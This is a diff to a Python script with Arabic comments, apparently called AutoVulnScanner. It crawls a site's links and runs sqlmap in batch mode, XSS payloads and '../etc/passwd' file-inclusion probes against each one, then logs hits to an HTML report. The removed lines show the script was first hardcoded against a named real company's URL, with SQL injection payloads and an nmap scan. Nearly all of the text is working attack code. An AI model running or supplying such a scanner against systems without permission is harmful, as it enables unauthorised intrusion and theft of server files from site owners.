@@ -2,38 +2,63 @@ import requests
 from bs4 import BeautifulSoup
 import subprocess
 
-# العنوان الهدف
-target_url = "https://www.qisolutions.us/en/?option=com_grid&gid=4/1000&p=0"
-
-# حمولات SQL Injection
-sql_payloads = ["'", "' OR '1'='1", "' OR 1=1 --", "' OR 'a'='a"]
-
 # حمولات XSS
 xss_payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]
 
 # حمولات File Inclusion
 file_inclusion_payloads = ["../etc/passwd", "../../etc/passwd"]
 
+# ملف التقرير
+report_file = "vulnerability_report.html"
+
+# تهيئة ملف التقرير
+def init_report():
+    with open(report_file, "w") as report:
+        report.write("<html><head><title>Vulnerability Report</title></head><body>")
+        report.write("<h1>Vulnerability Scan Report</h1><hr>")
+
 def log_results(result):
-    with open("vulnerability_report.txt", "a") as report:
-        report.write(result + "\n")
+    with open(report_file, "a") as report:
+        report.write(result + "<br>")
 
-def scan_ports(ip):
-    print(f"[*] Scanning open ports on {ip}")
-    result = subprocess.check_output(["nmap", "-sV", "-oN", "ports_scan.txt", ip])
-    print(result.decode())
-    log_results("Port scan results:\n" + result.decode())
+def close_report():
+    with open(report_file, "a") as report:
+        report.write("</body></html>")
 
-def test_sql_injection(url):
-    print(f"[*] Testing SQL Injection on {url}")
-    for payload in sql_payloads:
-        response = requests.get(url + payload)
-        if "mysql" in response.text.lower() or "syntax" in response.text.lower():
-            print(f"[+] SQL Injection vulnerability detected with payload: {payload}")
-            log_results(f"SQL Injection vulnerability found in {url} with payload: {payload}")
+# استخراج الروابط الفرعية من الصفحة الرئيسية
+def extract_links(url):
+    print(f"[*] Extracting links from {url}")
+    links = []
+    try:
+        response = requests.get(url)
+        soup = BeautifulSoup(response.text, "html.parser")
+        for link in soup.find_all("a", href=True):
+            href = link['href']
+            # تأكد من أن الرابط فرعي ومكمل للرابط الأساسي
+            if href.startswith("/"):
+                href = url + href
+            elif not href.startswith("http"):
+                continue
+            links.append(href)
+    except Exception as e:
+        print(f"[!] Error extracting links: {e}")
+    return links
+
+# تشغيل SQLMap لفحص ثغرات SQL Injection
+def run_sqlmap(url):
+    print(f"[*] Running SQLMap on {url}")
+    try:
+        result = subprocess.check_output(["sqlmap", "-u", url, "--batch", "-v", "1"], stderr=subprocess.STDOUT)
+        decoded_result = result.decode()
+        if "parameter" in decoded_result:
+            print(f"[+] SQL Injection vulnerability detected by SQLMap in {url}")
+            log_results(f"<b>SQL Injection vulnerability found by SQLMap in {url}</b>")
         else:
-            print(f"[-] No vulnerability detected with payload: {payload}")
+            print("[-] No SQL Injection vulnerability detected by SQLMap.")
+    except subprocess.CalledProcessError as e:
+        print(f"[!] Error running SQLMap: {e.output.decode()}")
 
+# فحص ثغرات XSS
 def test_xss(url, param):
     print(f"[*] Testing XSS on {url}")
     for payload in xss_payloads:
@@ -41,38 +66,51 @@ def test_xss(url, param):
         response = requests.get(url, params=data)
         if payload in response.text:
             print(f"[+] XSS vulnerability detected with payload: {payload}")
-            log_results(f"XSS vulnerability found in {url} with payload: {payload}")
+            log_results(f"<b>XSS vulnerability found in {url} with payload: {payload}</b>")
         else:
             print(f"[-] No XSS vulnerability detected with payload: {payload}")
 
+# فحص ثغرات تضمين الملفات
 def test_file_inclusion(url):
     print(f"[*] Testing File Inclusion on {url}")
     for payload in file_inclusion_payloads:
         response = requests.get(url + payload)
         if "root:x" in response.text or "bin/bash" in response.text:
             print(f"[+] File Inclusion vulnerability detected with payload: {payload}")
-            log_results(f"File Inclusion vulnerability found in {url} with payload: {payload}")
+            log_results(f"<b>File Inclusion vulnerability found in {url} with payload: {payload}</b>")
         else:
             print(f"[-] No File Inclusion vulnerability detected with payload: {payload}")
 
 # التشغيل الرئيسي للأداة
 def main():
-    print("[*] Starting vulnerability scan on target...")
+    print("[*] Welcome to AutoVulnScanner!")
     
-    # خطوة 1: جمع معلومات حول الهدف
-    target_ip = target_url.split("/")[2]
-    scan_ports(target_ip)
+    # طلب إدخال الرابط الأساسي من المستخدم
+    base_url = input("Enter the target URL (e.g., http://example.com): ")
     
-    # خطوة 2: فحص SQL Injection
-    test_sql_injection(target_url)
+    # تهيئة التقرير
+    init_report()
 
-    # خطوة 3: فحص XSS
-    test_xss(target_url, "id")  # تعديل 'id' بحسب مدخل الصفحة
-
-    # خطوة 4: فحص File Inclusion
-    test_file_inclusion(target_url)
+    # استخراج الروابط الفرعية من الرابط الأساسي
+    print("[*] Scanning for sub-links...")
+    links = extract_links(base_url)
     
-    print("[*] Scan complete. Results saved in vulnerability_report.txt")
+    # فحص SQL Injection باستخدام SQLMap، وفحص XSS، وفحص File Inclusion لكل رابط
+    for link in links:
+        print(f"\n[*] Scanning {link}")
+        
+        # فحص SQL Injection
+        run_sqlmap(link)
+
+        # فحص XSS
+        test_xss(link, "id")  # تعديل 'id' بحسب اسم المدخل في الرابط
+
+        # فحص File Inclusion
+        test_file_inclusion(link)
+
+    # إنهاء التقرير
+    close_report()
+    print(f"[*] Scan complete. Results saved in {report_file}")
 
 # تنفيذ الأداة
 if __name__ == "__main__":
